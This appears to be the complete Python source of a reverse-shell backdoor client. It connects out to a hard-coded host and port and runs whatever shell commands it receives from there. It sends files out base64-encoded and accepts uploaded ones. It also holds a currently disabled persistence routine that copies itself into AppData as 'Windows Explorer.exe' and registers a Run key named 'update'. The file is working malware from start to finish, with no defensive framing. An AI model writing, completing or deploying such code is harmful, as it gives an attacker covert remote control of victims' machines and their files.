import socket, subprocess
import json, base64
import os, sys, shutil

class Client:
    def __init__(self, ip, port):
        #self.doom_p()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def doom_p(self):
        location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(location):
            shutil.copyfile(sys.executable, location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"', shell = True)

    def send_data(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def receive_data(self):
        json_data = ""
        while True:
            try:
                json_data = self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def com_exe(self, command):
        DEVNULL = open(os.devnull, "wb")
        return subprocess.check_output(command, shell = True, stderr = DEVNULL, stdin = DEVNULL)

    def ch_dir(self, path):
        os.chdir(path)
        return "[+] Changing directory to: " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload completed successfully."

    def run(self):
        while True:
            command = self.receive_data()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    result = self.ch_dir(command[1])
                elif command[0] == "download":
                    result = self.read_file(command[1])
                elif command[0] == "upload":
                    result = self.write_file(command[1], result)
                else:
                    result = self.com_exe(command)
            except Exception:
                result = "[-] Error during command execution."

            self.send_data(result)

try:
    my_client = Client("192.168.0.15", 1234)
    my_client.run()
except Exception:
    sys.exit()